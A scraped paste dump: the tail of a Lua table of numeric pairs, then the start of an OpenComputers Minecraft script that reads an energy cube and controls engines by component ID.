	temp[2357] = {{6, 20}, {6, 27}, {6, 8}, {6, 15}, {6, 3}, {6, -9}, }
	temp[2358] = {}
	temp[2359] = {}
	temp[2360] = {}
	temp[2361] = {}
	temp[2362] = {}
	temp[2363] = {}
	temp[2364] = {}
	temp[2365] = {{6, 20}, {6, 27}, {6, 8}, {6, 15}, {6, 3}, {6, -9}, }
	temp[2366] = {}
	temp[2367] = {}
	temp[2368] = {}
	temp[2369] = {{6, 8}, {6, 12}, {6, -4}, }
	temp[2370] = {}
	temp[2371] = {}
	temp[2372] = {}
	temp[2373] = {{6, 8}, {6, 12}, {6, -4}, }
	temp[2374] = {}
	temp[2375] = {}
	temp[2376] = {}
	temp[2377] = {{6, 1}, {6, 10}, }
	temp[2378] = {}
	temp[2379] = {}
	temp[2380] = {}
	temp[2381] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, }
	temp[2382] = {}
	temp[2383] = {}
	temp[2384] = {}
	temp[2385] = {{6, 0}, {6, 8}, }
	temp[2386] = {}
	temp[2387] = {}
	temp[2388] = {}
	temp[2389] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, {6, -9}, }
	temp[2390] = {}
	temp[2391] = {}
	temp[2392] = {}
	temp[2393] = {{6, 3}, {6, 7}, }
	temp[2394] = {}
	temp[2395] = {}
	temp[2396] = {}
	temp[2397] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, {6, 3}, {6, 7}, {6, -9}, }
	temp[2398] = {}
	temp[2399] = {}
	temp[2400] = {}
	temp[2401] = {{6, 1}, {6, 5}, {6, -11}, }
	temp[2402] = {}
	temp[2403] = {}
	temp[2404] = {}
	temp[2405] = {{6, 1}, {6, 5}, {6, -11}, }
	temp[2406] = {}
	temp[2407] = {}
	temp[2408] = {}
	temp[2409] = {{6, 22}, {6, 25}, {6, 10}, {6, 13}, }
	temp[2410] = {}
	temp[2411] = {}
	temp[2412] = {}
	temp[2413] = {{6, -2}, {6, 10}, }
	temp[2414] = {}
	temp[2415] = {}
	temp[2416] = {}
	temp[2417] = {{6, -7}, }
	temp[2418] = {}
	temp[2419] = {}
	temp[2420] = {}
	temp[2421] = {{6, -2}, {6, 10}, }
	temp[2422] = {}
	temp[2423] = {}
	temp[2424] = {}
	temp[2425] = {{6, 22}, {6, 25}, {6, 13}, {6, 1}, {6, 10}, }
	temp[2426] = {}
	temp[2427] = {}
	temp[2428] = {}
	temp[2429] = {{6, 5}, {6, 8}, {6, -7}, }
	temp[2430] = {}
	temp[2431] = {}
	temp[2432] = {}
	temp[2433] = {{6, 3}, {6, 7}, {6, -11}, }
	temp[2434] = {}
	temp[2435] = {}
	temp[2436] = {}
	temp[2437] = {{6, 3}, {6, 7}, {6, -11}, }
	temp[2438] = {}
	temp[2439] = {}
	temp[2440] = {}
	temp[2441] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, }
	temp[2442] = {}
	temp[2443] = {}
	temp[2444] = {}
	temp[2445] = {{6, 3}, {6, 7}, {6, -11}, }
	temp[2446] = {}
	temp[2447] = {}
	temp[2448] = {}
	temp[2449] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, }
	temp[2450] = {}
	temp[2451] = {}
	temp[2452] = {}
	temp[2453] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, }
	temp[2454] = {}
	temp[2455] = {}
	temp[2456] = {}
	temp[2457] = {{6, 3}, {6, -11}, }
	temp[2458] = {}
	temp[2459] = {}
	temp[2460] = {}
	temp[2461] = {}
	temp[2462] = {}
	temp[2463] = {}
	temp[2464] = {}
	temp[2465] = {{6, 17}, {6, 13}, {6, 5}, {6, 8}, {6, -2}, }
	temp[2466] = {}
	temp[2467] = {}
	temp[2468] = {}
	temp[2469] = {}
	temp[2470] = {}
	temp[2471] = {}
	temp[2472] = {}
	temp[2473] = {{6, 19}, {6, 13}, {6, 3}, {6, 7}, {6, -9}, }
	temp[2474] = {}
	temp[2475] = {}
	temp[2476] = {}
	temp[2477] = {{6, 20}, {6, 12}, {6, 5}, {6, 8}, {6, -4}, }
	temp[2478] = {}
	temp[2479] = {}
	temp[2480] = {}
	temp[2481] = {}
	temp[2482] = {}
	temp[2483] = {}
	temp[2484] = {}
	temp[2485] = {{6, 16}, {6, 14}, {6, 8}, {6, 4}, }
	temp[2486] = {}
	temp[2487] = {}
	temp[2488] = {}
	temp[2489] = {}
	temp[2490] = {}
	temp[2491] = {}
	temp[2492] = {}
	temp[2493] = {}
	temp[2494] = {}
	temp[2495] = {}
	temp[2496] = {}
	temp[2497] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[2498] = {}
	temp[2499] = {}
	temp[2500] = {}
	temp[2501] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[2502] = {}
	temp[2503] = {}
	temp[2504] = {}
	temp[2505] = {{6, 20}, {6, 23}, {6, 16}, {6, 8}, {6, 11}, {6, -3}, {6, 4}, }
	temp[2506] = {}
	temp[2507] = {}
	temp[2508] = {}
	temp[2509] = {}
	temp[2510] = {}
	temp[2511] = {}
	temp[2512] = {}
	temp[2513] = {{6, 16}, {6, 21}, {6, 13}, {6, 4}, {6, 9}, {6, 1}, }
	temp[2514] = {}
	temp[2515] = {}
	temp[2516] = {}
	temp[2517] = {}
	temp[2518] = {}
	temp[2519] = {}
	temp[2520] = {}
	temp[2521] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[2522] = {}
	temp[2523] = {}
	temp[2524] = {}
	temp[2525] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[2526] = {}
	temp[2527] = {}
	temp[2528] = {}
	temp[2529] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[2530] = {}
	temp[2531] = {}
	temp[2532] = {}
	temp[2533] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[2534] = {}
	temp[2535] = {}
	temp[2536] = {}
	temp[2537] = {}
	temp[2538] = {}
	temp[2539] = {}
	temp[2540] = {}
	temp[2541] = {{6, 18}, {6, 23}, {6, 14}, {6, 2}, {6, 11}, {6, -13}, {6, -6}, }
	temp[2542] = {}
	temp[2543] = {}
	temp[2544] = {}
	temp[2545] = {}
	temp[2546] = {}
	temp[2547] = {}
	temp[2548] = {}
	temp[2549] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -10}, {6, -1}, }
	temp[2550] = {}
	temp[2551] = {}
	temp[2552] = {}
	temp[2553] = {}
	temp[2554] = {}
	temp[2555] = {}
	temp[2556] = {}
	temp[2557] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -10}, {6, -1}, }
	temp[2558] = {}
	temp[2559] = {}
	temp[2560] = {}
	temp[2561] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2562] = {}
	temp[2563] = {}
	temp[2564] = {}
	temp[2565] = {}
	temp[2566] = {}
	temp[2567] = {}
	temp[2568] = {}
	temp[2569] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2570] = {}
	temp[2571] = {}
	temp[2572] = {}
	temp[2573] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2574] = {}
	temp[2575] = {}
	temp[2576] = {}
	temp[2577] = {}
	temp[2578] = {}
	temp[2579] = {}
	temp[2580] = {}
	temp[2581] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -8}, {6, -1}, }
	temp[2582] = {}
	temp[2583] = {}
	temp[2584] = {}
	temp[2585] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2586] = {}
	temp[2587] = {}
	temp[2588] = {}
	temp[2589] = {}
	temp[2590] = {}
	temp[2591] = {}
	temp[2592] = {}
	temp[2593] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -3}, }
	temp[2594] = {}
	temp[2595] = {}
	temp[2596] = {}
	temp[2597] = {}
	temp[2598] = {}
	temp[2599] = {}
	temp[2600] = {}
	temp[2601] = {{6, 13}, {6, 16}, {6, 9}, {6, 1}, {6, 4}, {6, -3}, }
	temp[2602] = {}
	temp[2603] = {}
	temp[2604] = {}
	temp[2605] = {{6, 13}, {6, 16}, {6, 9}, {6, 1}, {6, 4}, {6, -3}, }
	temp[2606] = {}
	temp[2607] = {}
	temp[2608] = {}
	temp[2609] = {}
	temp[2610] = {}
	temp[2611] = {}
	temp[2612] = {}
	temp[2613] = {{6, 16}, {6, 4}, {6, -8}, }
	temp[2614] = {}
	temp[2615] = {}
	temp[2616] = {}
	temp[2617] = {}
	temp[2618] = {}
	temp[2619] = {}
	temp[2620] = {}
	temp[2621] = {{6, 16}, {6, 4}, {6, -8}, }
	temp[2622] = {}
	temp[2623] = {}
	temp[2624] = {}
	temp[2625] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[2626] = {}
	temp[2627] = {}
	temp[2628] = {}
	temp[2629] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[2630] = {}
	temp[2631] = {}
	temp[2632] = {}
	temp[2633] = {{6, 20}, {6, 23}, {6, 16}, {6, 8}, {6, 11}, {6, -3}, {6, 4}, }
	temp[2634] = {}
	temp[2635] = {}
	temp[2636] = {}
	temp[2637] = {}
	temp[2638] = {}
	temp[2639] = {}
	temp[2640] = {}
	temp[2641] = {{6, 16}, {6, 21}, {6, 13}, {6, 9}, {6, 1}, {6, 4}, }
	temp[2642] = {}
	temp[2643] = {}
	temp[2644] = {}
	temp[2645] = {}
	temp[2646] = {}
	temp[2647] = {}
	temp[2648] = {}
	temp[2649] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[2650] = {}
	temp[2651] = {}
	temp[2652] = {}
	temp[2653] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[2654] = {}
	temp[2655] = {}
	temp[2656] = {}
	temp[2657] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[2658] = {}
	temp[2659] = {}
	temp[2660] = {}
	temp[2661] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[2662] = {}
	temp[2663] = {}
	temp[2664] = {}
	temp[2665] = {}
	temp[2666] = {}
	temp[2667] = {}
	temp[2668] = {}
	temp[2669] = {{6, 18}, {6, 23}, {6, 14}, {6, 2}, {6, 11}, {6, -13}, {6, -6}, }
	temp[2670] = {}
	temp[2671] = {}
	temp[2672] = {}
	temp[2673] = {}
	temp[2674] = {}
	temp[2675] = {}
	temp[2676] = {}
	temp[2677] = {{6, 18}, {6, 23}, {6, 14}, {6, 2}, {6, 11}, {6, -13}, {6, -6}, }
	temp[2678] = {}
	temp[2679] = {}
	temp[2680] = {}
	temp[2681] = {{6, 18}, {6, 23}, {6, 14}, {6, 6}, {6, 11}, {6, -10}, {6, -1}, }
	temp[2682] = {}
	temp[2683] = {}
	temp[2684] = {}
	temp[2685] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -10}, {6, -1}, }
	temp[2686] = {}
	temp[2687] = {}
	temp[2688] = {}
	temp[2689] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2690] = {}
	temp[2691] = {}
	temp[2692] = {}
	temp[2693] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2694] = {}
	temp[2695] = {}
	temp[2696] = {}
	temp[2697] = {}
	temp[2698] = {}
	temp[2699] = {}
	temp[2700] = {}
	temp[2701] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[2702] = {}
	temp[2703] = {}
	temp[2704] = {}
	temp[2705] = {}
	temp[2706] = {}
	temp[2707] = {}
	temp[2708] = {}
	temp[2709] = {}
	temp[2710] = {}
	temp[2711] = {}
	temp[2712] = {}
	temp[2713] = {{6, 16}, {6, 8}, {6, 4}, }
	temp[2714] = {}
	temp[2715] = {}
	temp[2716] = {}
	temp[2717] = {}
	temp[2718] = {}
	temp[2719] = {}
	temp[2720] = {}
	temp[2721] = {{6, 14}, {6, 18}, {6, 9}, {6, 6}, {6, 2}, }
	temp[2722] = {}
	temp[2723] = {}
	temp[2724] = {}
	temp[2725] = {}
	temp[2726] = {}
	temp[2727] = {}
	temp[2728] = {}
	temp[2729] = {{6, 14}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -1}, }
	temp[2730] = {}
	temp[2731] = {}
	temp[2732] = {}
	temp[2733] = {{6, 16}, {6, 21}, {6, 13}, {6, 4}, {6, 9}, {6, -3}, }
	temp[2734] = {}
	temp[2735] = {}
	temp[2736] = {}
	temp[2737] = {}
	temp[2738] = {}
	temp[2739] = {}
	temp[2740] = {}
	temp[2741] = {{6, 9}, }
	temp[2742] = {}
	temp[2743] = {}
	temp[2744] = {}
	temp[2745] = {}
	temp[2746] = {}
	temp[2747] = {}
	temp[2748] = {}
	temp[2749] = {{6, 6}, }
	temp[2750] = {}
	temp[2751] = {}
	temp[2752] = {}
	temp[2753] = {{6, 4}, {6, -8}, }
	temp[2754] = {}
	temp[2755] = {}
	temp[2756] = {}
	temp[2757] = {{6, 4}, }
	temp[2758] = {}
	temp[2759] = {}
	temp[2760] = {}
	temp[2761] = {{6, 4}, {6, 20}, {6, 11}, }
	temp[2762] = {}
	temp[2763] = {}
	temp[2764] = {}
	temp[2765] = {{6, 16}, {6, 8}, }
	temp[2766] = {}
	temp[2767] = {}
	temp[2768] = {}
	temp[2769] = {{6, -4}, }
	temp[2770] = {}
	temp[2771] = {}
	temp[2772] = {}
	temp[2773] = {{6, 6}, {6, 11}, {6, 14}, }
	temp[2774] = {}
	temp[2775] = {}
	temp[2776] = {}
	temp[2777] = {}
	temp[2778] = {}
	temp[2779] = {}
	temp[2780] = {}
	temp[2781] = {{6, 6}, {6, 11}, {6, 14}, {6, -3}, }
	temp[2782] = {}
	temp[2783] = {}
	temp[2784] = {}
	temp[2785] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2786] = {}
	temp[2787] = {}
	temp[2788] = {}
	temp[2789] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2790] = {}
	temp[2791] = {}
	temp[2792] = {}
	temp[2793] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2794] = {}
	temp[2795] = {}
	temp[2796] = {}
	temp[2797] = {{6, -8}, }
	temp[2798] = {}
	temp[2799] = {}
	temp[2800] = {}
	temp[2801] = {{6, -8}, }
	temp[2802] = {}
	temp[2803] = {}
	temp[2804] = {}
	temp[2805] = {{6, 9}, }
	temp[2806] = {}
	temp[2807] = {}
	temp[2808] = {}
	temp[2809] = {{6, -3}, }
	temp[2810] = {}
	temp[2811] = {}
	temp[2812] = {}
	temp[2813] = {{6, 6}, }
	temp[2814] = {}
	temp[2815] = {}
	temp[2816] = {}
	temp[2817] = {{6, 4}, {6, -8}, }
	temp[2818] = {}
	temp[2819] = {}
	temp[2820] = {}
	temp[2821] = {{6, 4}, }
	temp[2822] = {}
	temp[2823] = {}
	temp[2824] = {}
	temp[2825] = {{6, 4}, {6, 20}, {6, 11}, }
	temp[2826] = {}
	temp[2827] = {}
	temp[2828] = {}
	temp[2829] = {{6, 16}, {6, 8}, }
	temp[2830] = {}
	temp[2831] = {}
	temp[2832] = {}
	temp[2833] = {{6, -4}, }
	temp[2834] = {}
	temp[2835] = {}
	temp[2836] = {}
	temp[2837] = {{6, 6}, {6, 11}, {6, 14}, }
	temp[2838] = {}
	temp[2839] = {}
	temp[2840] = {}
	temp[2841] = {}
	temp[2842] = {}
	temp[2843] = {}
	temp[2844] = {}
	temp[2845] = {{6, 6}, {6, 11}, {6, 14}, {6, -3}, }
	temp[2846] = {}
	temp[2847] = {}
	temp[2848] = {}
	temp[2849] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2850] = {}
	temp[2851] = {}
	temp[2852] = {}
	temp[2853] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2854] = {}
	temp[2855] = {}
	temp[2856] = {}
	temp[2857] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2858] = {}
	temp[2859] = {}
	temp[2860] = {}
	temp[2861] = {{6, -8}, }
	temp[2862] = {}
	temp[2863] = {}
	temp[2864] = {}
	temp[2865] = {{6, -8}, }
	temp[2866] = {}
	temp[2867] = {}
	temp[2868] = {}
	temp[2869] = {{6, 9}, }
	temp[2870] = {}
	temp[2871] = {}
	temp[2872] = {}
	temp[2873] = {{6, -3}, }
	temp[2874] = {}
	temp[2875] = {}
	temp[2876] = {}
	temp[2877] = {{6, 6}, }
	temp[2878] = {}
	temp[2879] = {}
	temp[2880] = {}
	temp[2881] = {{6, 4}, {6, -8}, }
	temp[2882] = {}
	temp[2883] = {}
	temp[2884] = {}
	temp[2885] = {{6, 4}, {6, -8}, }
	temp[2886] = {}
	temp[2887] = {}
	temp[2888] = {}
	temp[2889] = {{6, 4}, {6, -8}, }
	temp[2890] = {}
	temp[2891] = {}
	temp[2892] = {}
	temp[2893] = {}
	temp[2894] = {}
	temp[2895] = {}
	temp[2896] = {}
	temp[2897] = {{6, 6}, {6, -6}, }
	temp[2898] = {}
	temp[2899] = {}
	temp[2900] = {}
	temp[2901] = {}
	temp[2902] = {}
	temp[2903] = {}
	temp[2904] = {}
	temp[2905] = {{6, 8}, {6, -4}, }
	temp[2906] = {}
	temp[2907] = {}
	temp[2908] = {}
	temp[2909] = {{6, 9}, {6, -3}, }
	temp[2910] = {}
	temp[2911] = {}
	temp[2912] = {}
	temp[2913] = {}
	temp[2914] = {}
	temp[2915] = {}
	temp[2916] = {}
	temp[2917] = {{6, 21}, {6, 25}, {6, 16}, }
	temp[2918] = {}
	temp[2919] = {}
	temp[2920] = {}
	temp[2921] = {}
	temp[2922] = {}
	temp[2923] = {}
	temp[2924] = {}
	temp[2925] = {{6, 21}, {6, 25}, {6, 16}, }
	temp[2926] = {}
	temp[2927] = {}
	temp[2928] = {}
	temp[2929] = {{6, 18}, {6, 23}, {6, 14}, }
	temp[2930] = {}
	temp[2931] = {}
	temp[2932] = {}
	temp[2933] = {{6, 9}, {6, 18}, {6, 23}, {6, 14}, }
	temp[2934] = {}
	temp[2935] = {}
	temp[2936] = {}
	temp[2937] = {{6, 16}, {6, 21}, {6, 13}, }
	temp[2938] = {}
	temp[2939] = {}
	temp[2940] = {}
	temp[2941] = {{6, 6}, }
	temp[2942] = {}
	temp[2943] = {}
	temp[2944] = {}
	temp[2945] = {{6, 4}, {6, -8}, }
	temp[2946] = {}
	temp[2947] = {}
	temp[2948] = {}
	temp[2949] = {{6, 4}, }
	temp[2950] = {}
	temp[2951] = {}
	temp[2952] = {}
	temp[2953] = {{6, 4}, {6, 20}, {6, 11}, }
	temp[2954] = {}
	temp[2955] = {}
	temp[2956] = {}
	temp[2957] = {{6, 16}, {6, 8}, }
	temp[2958] = {}
	temp[2959] = {}
	temp[2960] = {}
	temp[2961] = {{6, -4}, }
	temp[2962] = {}
	temp[2963] = {}
	temp[2964] = {}
	temp[2965] = {{6, 6}, {6, 11}, {6, 14}, }
	temp[2966] = {}
	temp[2967] = {}
	temp[2968] = {}
	temp[2969] = {}
	temp[2970] = {}
	temp[2971] = {}
	temp[2972] = {}
	temp[2973] = {{6, 6}, {6, 11}, {6, 14}, {6, -3}, }
	temp[2974] = {}
	temp[2975] = {}
	temp[2976] = {}
	temp[2977] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2978] = {}
	temp[2979] = {}
	temp[2980] = {}
	temp[2981] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2982] = {}
	temp[2983] = {}
	temp[2984] = {}
	temp[2985] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[2986] = {}
	temp[2987] = {}
	temp[2988] = {}
	temp[2989] = {{6, -8}, }
	temp[2990] = {}
	temp[2991] = {}
	temp[2992] = {}
	temp[2993] = {{6, -8}, }
	temp[2994] = {}
	temp[2995] = {}
	temp[2996] = {}
	temp[2997] = {{6, 9}, }
	temp[2998] = {}
	temp[2999] = {}
	temp[3000] = {}
	temp[3001] = {{6, -3}, }
	temp[3002] = {}
	temp[3003] = {}
	temp[3004] = {}
	temp[3005] = {{6, 6}, }
	temp[3006] = {}
	temp[3007] = {}
	temp[3008] = {}
	temp[3009] = {{6, 4}, {6, -8}, }
	temp[3010] = {}
	temp[3011] = {}
	temp[3012] = {}
	temp[3013] = {{6, 4}, }
	temp[3014] = {}
	temp[3015] = {}
	temp[3016] = {}
	temp[3017] = {{6, 4}, {6, 20}, {6, 11}, }
	temp[3018] = {}
	temp[3019] = {}
	temp[3020] = {}
	temp[3021] = {{6, 16}, {6, 8}, }
	temp[3022] = {}
	temp[3023] = {}
	temp[3024] = {}
	temp[3025] = {{6, -4}, }
	temp[3026] = {}
	temp[3027] = {}
	temp[3028] = {}
	temp[3029] = {{6, 6}, {6, 11}, {6, 14}, }
	temp[3030] = {}
	temp[3031] = {}
	temp[3032] = {}
	temp[3033] = {}
	temp[3034] = {}
	temp[3035] = {}
	temp[3036] = {}
	temp[3037] = {{6, 6}, {6, 11}, {6, 14}, {6, -3}, }
	temp[3038] = {}
	temp[3039] = {}
	temp[3040] = {}
	temp[3041] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[3042] = {}
	temp[3043] = {}
	temp[3044] = {}
	temp[3045] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[3046] = {}
	temp[3047] = {}
	temp[3048] = {}
	temp[3049] = {{6, 4}, {6, 9}, {6, 13}, }
	temp[3050] = {}
	temp[3051] = {}
	temp[3052] = {}
	temp[3053] = {{6, -8}, }
	temp[3054] = {}
	temp[3055] = {}
	temp[3056] = {}
	temp[3057] = {{6, -8}, }
	temp[3058] = {}
	temp[3059] = {}
	temp[3060] = {}
	temp[3061] = {{6, 9}, }
	temp[3062] = {}
	temp[3063] = {}
	temp[3064] = {}
	temp[3065] = {{6, -3}, }
	temp[3066] = {}
	temp[3067] = {}
	temp[3068] = {}
	temp[3069] = {{6, 6}, }
	temp[3070] = {}
	temp[3071] = {}
	temp[3072] = {}
	temp[3073] = {{6, 16}, {6, 4}, {6, -8}, }
	temp[3074] = {}
	temp[3075] = {}
	temp[3076] = {}
	temp[3077] = {}
	temp[3078] = {}
	temp[3079] = {}
	temp[3080] = {}
	temp[3081] = {{6, 16}, {6, 4}, {6, -8}, }
	temp[3082] = {}
	temp[3083] = {}
	temp[3084] = {}
	temp[3085] = {}
	temp[3086] = {}
	temp[3087] = {}
	temp[3088] = {}
	temp[3089] = {{6, 16}, {6, 4}, {6, -8}, }
	temp[3090] = {}
	temp[3091] = {}
	temp[3092] = {}
	temp[3093] = {}
	temp[3094] = {}
	temp[3095] = {}
	temp[3096] = {}
	temp[3097] = {}
	temp[3098] = {}
	temp[3099] = {}
	temp[3100] = {}
	temp[3101] = {}
	temp[3102] = {}
	temp[3103] = {}
	temp[3104] = {}
	temp[3105] = {{6, 14}, {6, 18}, {6, 9}, {6, 6}, {6, -8}, }
	temp[3106] = {}
	temp[3107] = {}
	temp[3108] = {}
	temp[3109] = {}
	temp[3110] = {}
	temp[3111] = {}
	temp[3112] = {}
	temp[3113] = {}
	temp[3114] = {}
	temp[3115] = {}
	temp[3116] = {}
	temp[3117] = {}
	temp[3118] = {}
	temp[3119] = {}
	temp[3120] = {}
	temp[3121] = {{6, 20}, {6, 23}, {6, 14}, {6, 8}, {6, -8}, }
	temp[3122] = {}
	temp[3123] = {}
	temp[3124] = {}
	temp[3125] = {}
	temp[3126] = {}
	temp[3127] = {}
	temp[3128] = {}
	temp[3129] = {}
	temp[3130] = {}
	temp[3131] = {}
	temp[3132] = {}
	temp[3133] = {}
	temp[3134] = {}
	temp[3135] = {}
	temp[3136] = {}
	temp[3137] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[3138] = {}
	temp[3139] = {}
	temp[3140] = {}
	temp[3141] = {{6, 21}, {6, 25}, {6, 16}, {6, 9}, {6, 13}, {6, -3}, {6, 4}, }
	temp[3142] = {}
	temp[3143] = {}
	temp[3144] = {}
	temp[3145] = {{6, 20}, {6, 23}, {6, 16}, {6, 8}, {6, 11}, {6, -3}, {6, 4}, }
	temp[3146] = {}
	temp[3147] = {}
	temp[3148] = {}
	temp[3149] = {}
	temp[3150] = {}
	temp[3151] = {}
	temp[3152] = {}
	temp[3153] = {{6, 16}, {6, 21}, {6, 13}, {6, 9}, {6, 1}, {6, 4}, }
	temp[3154] = {}
	temp[3155] = {}
	temp[3156] = {}
	temp[3157] = {}
	temp[3158] = {}
	temp[3159] = {}
	temp[3160] = {}
	temp[3161] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[3162] = {}
	temp[3163] = {}
	temp[3164] = {}
	temp[3165] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -11}, {6, -1}, }
	temp[3166] = {}
	temp[3167] = {}
	temp[3168] = {}
	temp[3169] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[3170] = {}
	temp[3171] = {}
	temp[3172] = {}
	temp[3173] = {{6, 14}, {6, 18}, {6, 9}, {6, 2}, {6, 6}, {6, -10}, {6, -3}, }
	temp[3174] = {}
	temp[3175] = {}
	temp[3176] = {}
	temp[3177] = {}
	temp[3178] = {}
	temp[3179] = {}
	temp[3180] = {}
	temp[3181] = {{6, 18}, {6, 23}, {6, 14}, {6, 2}, {6, 11}, {6, -13}, {6, -6}, }
	temp[3182] = {}
	temp[3183] = {}
	temp[3184] = {}
	temp[3185] = {}
	temp[3186] = {}
	temp[3187] = {}
	temp[3188] = {}
	temp[3189] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -10}, {6, -1}, }
	temp[3190] = {}
	temp[3191] = {}
	temp[3192] = {}
	temp[3193] = {}
	temp[3194] = {}
	temp[3195] = {}
	temp[3196] = {}
	temp[3197] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -10}, {6, -1}, }
	temp[3198] = {}
	temp[3199] = {}
	temp[3200] = {}
	temp[3201] = {{6, 16}, {6, 20}, {6, 11}, {6, 4}, {6, 8}, {6, -8}, {6, -1}, }
	temp[3202] = {}
	temp[3203] = {}
	temp[3204] = {}
	temp[3205] = {}
	temp[3206] = {}
	temp[3207] = {}
	temp[3208] = {}
	temp[3209] = {{6, 20}, {6, 8}, }
	temp[3210] = {}
	temp[3211] = {}
	temp[3212] = {}
	temp[3213] = {{6, 20}, {6, 8}, }
	temp[3214] = {}
	temp[3215] = {}
	temp[3216] = {}
	temp[3217] = {{6, 20}, {6, 8}, }
	temp[3218] = {}
	temp[3219] = {}
	temp[3220] = {}
	temp[3221] = {}
	temp[3222] = {}
	temp[3223] = {}
	temp[3224] = {}
	temp[3225] = {{6, 16}, {6, 4}, }
	temp[3226] = {}
	temp[3227] = {}
	temp[3228] = {}
	temp[3229] = {{6, 14}, {6, 18}, {6, 9}, {6, 6}, {6, -8}, {6, -1}, }
	temp[3230] = {}
	temp[3231] = {}
	temp[3232] = {}
	temp[3233] = {}
	temp[3234] = {}
	temp[3235] = {}
	temp[3236] = {}
	temp[3237] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -8}, {6, -1}, }
	temp[3238] = {}
	temp[3239] = {}
	temp[3240] = {}
	temp[3241] = {}
	temp[3242] = {}
	temp[3243] = {}
	temp[3244] = {}
	temp[3245] = {{6, 18}, {6, 21}, {6, 14}, {6, 6}, {6, 9}, {6, -8}, {6, -1}, }
	temp[3246] = {}
	temp[3247] = {}
	temp[3248] = {}
	temp[3249] = {{6, 16}, {6, 21}, {6, 13}, {6, 4}, {6, 9}, {6, -3}, }

	return temp
end"
3NHGh3Cr,power_1.4.lua,davedumas0,Lua,Friday 2nd of June 2023 12:34:02 PM CDT,"--================
--  PART 1  START
--================

-- Load the components
local component = require(""component"")
local gpu = component.gpu
local sides = require(""sides"")
local computer = require(""computer"")
local term = require(""term"")
-- Load the energy cube
local energyCube = component.elite_energy_cube
local engine_4_bank_2 = ""14470fcc-cb6d-4acd-90c1-4975ed9ce48f""
local engine_3_bank_2 = ""fcd32370-6b57-4c50-b224-97afb2598de6""
local engine_2_bank_2 = ""f04fbbe0-fd11-4748-9eaf-a95d7a1409ec""
local engine_1_bank_2 = ""fa76b96e-5c83-4944-be81-4d2ceb3dbb61""
local engine_1_bank_1 = ""08a57843-b7b5-4a5f-be68-6693ede070ef""
local engine_2_bank_1 = ""a72b707d-9902-4b4e-b33d-c59c91057cd4""
local engine_3_bank_1 = ""9ad89be2-98f6-488f-b07c-e6438f3a639e""
local engine_4_bank_1 = ""bebbcce8-435f-448c-a6bd-5b5e8566c39c""


-- Variables
local energy = 0
local maxEnergy = 0

local fluidLevel = 0
local maxFluidLevel = 0

-- Thresholds for bundled wire outputs
local offThreshold = 11000000 -- Energy threshold to turn the engine off
